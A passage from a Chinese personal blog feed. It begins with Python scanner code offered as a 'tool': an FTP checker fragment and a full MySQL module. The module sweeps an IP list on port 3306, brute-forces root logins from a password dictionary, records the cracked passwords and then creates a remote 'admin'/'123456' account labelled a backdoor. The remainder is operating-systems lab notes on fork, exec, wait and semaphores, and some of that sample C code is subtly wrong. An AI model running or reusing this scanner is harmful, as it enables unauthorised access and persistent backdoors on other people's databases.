&quot;s ftp 文件目录为：&quot;)                ftp.dir()                break    except Exception as e:        print(e)        print(&quot;\n[+] &quot; + str(self.ip) + &quot;s ftp service is bad!\r\n&quot;)        pass    returndef save_result(self, save_path, result_list):    s = open(self.save_path, &quot;a&quot;)    s.write(result_list)    s.close()    returndef threadpool(self):    with open(&apos;iprange.txt&apos;, &apos;rb&apos;) as f:        for line in f.readlines():            self.ip_list.append(line.strip())    print(self.ip_list)    t1 = datetime.now()    # 线程数为20    pool = ThreadPool(processes=20)    try:        pool.map(self.port_scan, self.ip_list)    except Exception as e:        print(e)    pool.close()    pool.join()    print(&apos;Multiprocess Scanning Completed in  &apos;, datetime.now() - t1)    # port_scan(save_path=&quot;./result.txt&quot;)    return</code></pre><p><strong>MySQLModule.py</strong></p><pre><code>import pymysqlimport socketimport timefrom datetime import datetimefrom multiprocessing.dummy import Pool as ThreadPoolclass MySQL(object):    def __init__(self):        self.save_path = &quot;./result.txt&quot;        self.ip_list = []    def port_scan(self, ip):        t1 = datetime.now()        print(&quot;[+] Testing ports of : &quot; + str(ip) + &quot;\n&quot;)        # scan_port(line.strip())        url1 = ip        # 测试mysql端口是否开放        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        sk.settimeout(1)        try:            res = sk.connect_ex((ip, 3306))            if res == 0:                print(&quot;\n[+] &quot; + str(url1) + &quot;\&apos;s Mysql is ok! try to login...\r\n&quot;)                self.try_login_sqlserver(url1)        except Exception as e:            print(&quot;\n[-] &quot; + str(url1) + &quot;\&apos;s Mysql is bad! &quot; + e + &quot;\r\n&quot;)        sk.close()        return    # 尝试登陆mysql服务    def try_login_sqlserver(self, ip):        with open(&apos;dict.txt&apos;, &apos;r&apos;) as f:            for line in f.readlines():                print(&quot;[+] Testing ip: &quot; + str(ip) + &quot; &amp; testing password：&quot; + line.strip())                # information_schema 是 Mysql 的默认数据库，我们有权限操作                # PyMysql.cursors.DictCursor 以字典方式进行连接参数管理                try:                    connection = pymysql.connect(host=ip,                                                 user=&apos;root&apos;,                                                 password=line.strip(),                                                 db=&apos;information_schema&apos;,                                                 charset=&apos;utf8mb4&apos;,                                                 cursorclass=pymysql.cursors.DictCursor)                    print(&quot;\n[+] Testing ip: &quot; + str(ip) + &quot; Login successfully! try to set a backdoor account...\r\n&quot;)                    result_list = &quot;\nsql service -- &quot; + str(time.asctime()) + &quot; ip: &quot; + str(ip) + &quot; pwd : &quot; + \                                  str(line.strip())                    self.save_result(result_list)                    # 后门账号密码为 admin 123456                    self.try_set_backdoor(connection)                    connection.close()                except Exception as e:                    # print &quot;[-] &quot; + str(e.message)                    print(&quot;\n[+] Testing ip: &quot; + str(ip) + &quot;  Using weakly password login failed!...&quot; + str(e) + &quot;\r\n&quot;)                pass        return    def try_set_backdoor(self, connection):        try:            with connection.cursor() as cursor:                # 创建一个新用户                sql = &quot;CREATE user &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;;&quot;                cursor.execute(sql)                # 将后门用户权限给到最大                cursor.execute(&quot;flush privileges;&quot;)                connection.commit()                connection.close()                print(&quot;[+] New account set successfully!\r\n&quot;)        except Exception as e:            # print e            print(&quot;[-] New account set failed! &quot; + str(e) + &apos;\r\n&apos;)        return    def save_result(self, result_list):        s = open(self.save_path, &quot;a&quot;)        s.write(result_list)        s.close()        return    def threadpool(self):        with open(&apos;iprange.txt&apos;, &apos;rb&apos;) as f:            for line in f.readlines():                self.ip_list.append(line.strip())        print(self.ip_list)        t1 = datetime.now()        # 线程数为20        pool = ThreadPool(processes=20)        try:            pool.map(self.port_scan, self.ip_list)        except Exception as e:            print(e)        pool.close()        pool.join()        print(&apos;Multiprocess Scanning Completed in  &apos;, datetime.now() - t1)        # port_scan(save_path=&quot;./result.txt&quot;)        return</code></pre><h3 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h3><p>在网上找到弱口令账号之后，对方并没有开启远程登陆，也没法登陆成功！该怎么解决呢？明天再看看！12/16/2019 5:34:36 PM </p><p>答：如果不开启远程登陆，就无法远程连接该数据库，视为未开放弱口令</p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><blockquote><p><a href="https://www.cnblogs.com/KevinGeorge/p/7858564.html" target="_blank" rel="noopener">https://www.cnblogs.com/KevinGeorge/p/7858564.html</a></p><p><a href="https://nmap.org/man/zh/man-host-discovery.html" target="_blank" rel="noopener">https://nmap.org/man/zh/man-host-discovery.html</a></p><p><a href="https://pypi.org/project/pcap-ct/" target="_blank" rel="noopener">https://pypi.org/project/pcap-ct/</a></p><p><a href="https://github.com/PyMySQL/PyMySQL/">https://github.com/PyMySQL/PyMySQL/</a></p><p><a href="https://blog.csdn.net/rebelqsp/article/details/22109925" target="_blank" rel="noopener">https://blog.csdn.net/rebelqsp/article/details/22109925</a></p><p><a href="https://www.jb51.net/article/62238.htm" target="_blank" rel="noopener">https://www.jb51.net/article/62238.htm</a></p><p><a href="https://blog.csdn.net/weixin_33805992/article/details/86435703" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33805992/article/details/86435703</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySql </tag>
            
            <tag> FTP </tag>
            
            <tag> scan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OS</title>
      <link href="/2020/04/29/OS/"/>
      <url>/2020/04/29/OS/</url>
      
        <content type="html"><![CDATA[<h1 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h1><h2 id="实验一-进程控制"><a href="#实验一-进程控制" class="headerlink" title="实验一 进程控制"></a>实验一 进程控制</h2><p> <strong>fork()</strong></p><p>用于创建一个新进程（子进程）。</p><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> fork(<span class="keyword">void</span>);</span><br></pre></td></tr></table></figure><p>返回：子进程中为0，父进程中为子进程ID，出错为-1。</p><p>子进程被创建后就进入就绪队列和父进程分别独立地等待调度。子进程继承父进程的程序段代码，子进程被调度执行时，也会和父进程一样从fork()返回。从共享程序段代码的角度来看，父进程和子进程所执行的程序代码是同一个，在内存中只有一个程序副本；但是从编程的角度来看，为了使子进程和父进程做不同的事，需要在程序中区分父进程和子进程的代码段。这需要借助于fork()的返回值来标志当前进程的身份。从fork()返回后，都会执行语句：<code>pid=frok();</code></p><p>得到返回值pid有三种情况，分别对应出错（小于0）、在父进程中（大于0）、在子进程中（等于0）。</p><p>由于父进程和子进程各自独立地进入就绪队列等待调度，所以谁会先得到调度是不确定的，这与系统的调度策略和系统当前的资源状态有关。因此谁会先从fork()返回并继续执行后面的语句也是不确定的。</p><p> <strong>wait()</strong></p><p>查询子进程的退出状态(即正常退出的退出码或导致异常终止的信号)，并回收子进程的内核资源。</p><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> wait(<span class="keyword">int</span> *status);</span><br></pre></td></tr></table></figure><p>返回值：若成功则返回进程ID，若出错则返回-1。</p><p>Wait()函数常用来控制父进程和子进程的同步。在父进程中调用wait()函数，则父进程被阻塞，进入等待队列，等待子进程结束。当子进程结束时，会产生一个终止状态字，系统会向父进程发送SIGCHLD信号。当接到信号后，父进程提取子进程的终止状态字，从wait()函数返回继续执行原程序。</p><p><strong>exit()</strong></p><p>exit()是进程结束最长调用的函数，在main()函数中调用return，最终也是调用exit()函数。这些都是进程的正常终止。在正常终止时，exit()函数返回进程结束状态。</p><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> status)</span></span></span><br></pre></td></tr></table></figure><p>从OS角度来看，进程终止会释放进程用户空间的所有资源，而进程描述符并不释放，它将来由其父进程回收。若父进程先于子进程终止，子进程成为“孤儿进程”，“孤儿进程”会被init进程（进程号为1）领养；若子进程先于父进程终止，子进程成为“僵尸进程”，父进程尚未对其进行善后处理(获取终止子进程的有关信息，释放它仍占用的资源)。</p><p><strong>execl()</strong></p><p>系统调用execl()可以将新程序加载到某一进程的内存空间，该进程会从新程序的main()函数开始执行。</p><p>函数原型：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execl</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>*pathname, <span class="keyword">const</span> <span class="keyword">char</span> *arg0,…<span class="comment">/*(char*)0*/</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">pathname是要加载程序的全路径名，arg0及以后为参数列表。</span><br></pre></td></tr></table></figure><p>  进程的用户内存空间被替换，而进程的其他属性基本不改变。进程完整的内存空间：正文区、堆区、栈区、数据区都被替换，原内容不存在了。代码替换完后，在execl()后面的代码毫无意义。</p><p>example.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//print.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> *m=(<span class="keyword">char</span> *)argv[<span class="number">1</span>];</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,m);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//example1.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span> pid;</span><br><span class="line">  <span class="keyword">if</span>((pid=fork())&lt;<span class="number">0</span>)&#123;   <span class="comment">//出错</span></span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"fork faild\n"</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;    <span class="comment">//子进程执行</span></span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"Child process!\n"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"PID=%d  PPID=%d \n"</span>,getpid(),getppid()); <span class="comment">//getpid()获取进程号, getppid()获取父进程号</span></span><br><span class="line">     execl(<span class="string">"print"</span>,<span class="string">"print"</span>,<span class="string">"hello"</span>,<span class="literal">NULL</span>);  <span class="comment">//代码替换</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;    <span class="comment">//父进程执行</span></span><br><span class="line">     wait();</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"Parent process!\n"</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">编译运行方法：</span><br><span class="line"><span class="meta">#gcc print.c –o print</span></span><br><span class="line"><span class="meta">#gcc example1.c –o example</span></span><br><span class="line">#./example</span><br></pre></td></tr></table></figure><p>编写一段程序，使用系统调用fork()创建两个子进程，当此程序运行时，在系统中有一个父进程和两个子进程活动。让每一个进程在屏幕上显示“身份信息”：父进程显示“Parent process! PID=xxx1 PPID=xxx2”；子进程显示“Childx process! PID=xxx PPID=xxx”。多运行几次，观察记录屏幕上的显示结果，并分析原因。</p><p>说明：</p><blockquote><p>xxx1为进程号，用getpid()函数可获取进程号；</p><p>xxx2为父进程号，用getppid()函数可获取父进程号；</p><p>Childx中x为1和2，用来区别两个子进程；</p><p>wait()函数用来避免父进程在子进程终止之前终止。</p></blockquote><p>fork.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pid_t</span> child1,child2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(child1=fork()==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Child1 process! PID=%d  PPID=%d \n"</span>,getpid(),getppid());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(child1&lt;<span class="number">0</span>||child2&lt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fork error.\n"</span>);</span><br><span class="line"><span class="comment">//exit(0);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> status;</span><br><span class="line">wait(&amp;status);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Parent process! PID=%d  PPID=%d \n"</span>,getpid(),getppid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(child2=fork()==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Child2 process! PID=%d  PPID=%d \n"</span>,getpid(),getppid());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(child2&lt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fork error.\n"</span>);</span><br><span class="line"><span class="comment">//exit(0);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> status;</span><br><span class="line">wait(&amp;status);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Parent process! PID=%d  PPID=%d \n"</span>,getpid(),getppid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>fork()和exec()系列函数能同时运行多个程序，利用上述函数将下面单进程顺序执行的程序single.c改造成可并发执行3个进程的程序 multi_process.c ；并用time命令获取程序的执行时间，比较单进程和多进程运行时间，并分析原因。 </p><p>multi_process.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM 5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_msg</span><span class="params">(<span class="keyword">char</span> *m)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">int</span> i; </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;NUM; i++)&#123; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,m); </span><br><span class="line">fflush(<span class="built_in">stdout</span>); </span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> pid[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">pid[i<span class="number">-1</span>]=fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pid[i<span class="number">-1</span>]==<span class="number">0</span>||pid[i<span class="number">-1</span>]==<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pid[<span class="number">0</span>]==<span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">print_msg(<span class="string">"Good"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pid[<span class="number">1</span>]==<span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">print_msg(<span class="string">"Hello"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pid[<span class="number">2</span>]==<span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">print_msg(<span class="string">"2017****10"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait();</span><br><span class="line"></span><br><span class="line">wait();</span><br><span class="line"></span><br><span class="line">wait();</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验二-进程同步"><a href="#实验二-进程同步" class="headerlink" title="实验二 进程同步"></a>实验二 进程同步</h2><p>为了简化对多个信号量的操作，Linux系统中提出了信号量集的概念。一个信号量集对象中可以容纳多个信号量，System V 信号量的分配和操作是以信号量集为单位的。</p><p><strong>进程利用信号量获得共享资源的步骤</strong></p><blockquote><p>使用资源时，进程将该信号量减1(P操作)；</p><p>不再使用资源时，进程将该信号量值加1(V操作)；</p></blockquote><p><strong>创建或打开信号量集</strong></p><p><code>semget()</code> 系统调用创建一个新信号量集或获取一个既有信号量集的表示符。</p><p>函数原型：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> nsems, <span class="keyword">int</span> flag)</span></span>;</span><br></pre></td></tr></table></figure><p>返回值：成功返回信号量集ID，出错返回-1。<strong>注意：建立信号量集时每个信号量的初始值不确定。</strong></p><p><strong>信号量控制操作</strong></p><p><code>semctl()</code> 系统调用在一个信号量集或集合中的单个信号量上执行各种控制操作。</p><p>函数原型：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semctl</span> <span class="params">(<span class="keyword">int</span> semid, <span class="keyword">int</span> semnum, <span class="keyword">int</span> cmd,  …<span class="comment">/*union semun arg*/</span>)</span></span></span><br></pre></td></tr></table></figure><p><code>semnum:</code> 信号量编号或0，表示对指定信号量做控制操作；</p><p><code>cmd:</code>  操作命令，实施的控制操作；</p><table><thead><tr><th align="left">IPC_STAT   获取信号量集的属性              IPC_SET   设置信号量集的属性     IPC_RMID  删除信号量集</th></tr></thead><tbody><tr><td align="left">GETVAL   返回 semnum 信号量的值        SETVAL    设置semnum信号量的值</td></tr><tr><td align="left">GETALL   获取所有信号量的值                 SETALL    设置所有信号量的初始值</td></tr></tbody></table><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> semun&#123;</span><br><span class="line">    <span class="keyword">int</span>  val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">semid_ds</span>  *<span class="title">buf</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span>  *<span class="built_in">array</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>信号量集操作</strong></p><p>semop()系统调用在semid标识的信号量集中的信号量上执行一个或多个up或down操作，可用于进程间的同步和互斥。</p><p>函数原型：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semop</span><span class="params">(<span class="keyword">int</span> semid, struct sembuf *semop, <span class="keyword">size_t</span> nops)</span></span>;</span><br><span class="line">返回：成功返回<span class="number">0</span>，出错返回<span class="number">-1</span>。</span><br><span class="line">Struct sembuf&#123;</span><br><span class="line"><span class="keyword">unsigned</span> sem_num;   <span class="comment">/*member # in set*/</span></span><br><span class="line"><span class="keyword">short</span> sem_op; <span class="comment">/*operation(negative, 0, positive*/</span></span><br><span class="line"><span class="keyword">short</span>   sem_flg;      <span class="comment">/*IPC_NOWAIT,SEM_UNDO*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>组合权限说明</strong></p><p>0666 文件或目录的所有者、所有者所在组、其他用户对该对象均可读、可写 rw-rw-rw-</p><p>0777 文件或目录的所有者、所有者所在组、其他用户对该对象均可读、可写、可执行 rwxrwxrwx</p><p>example.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 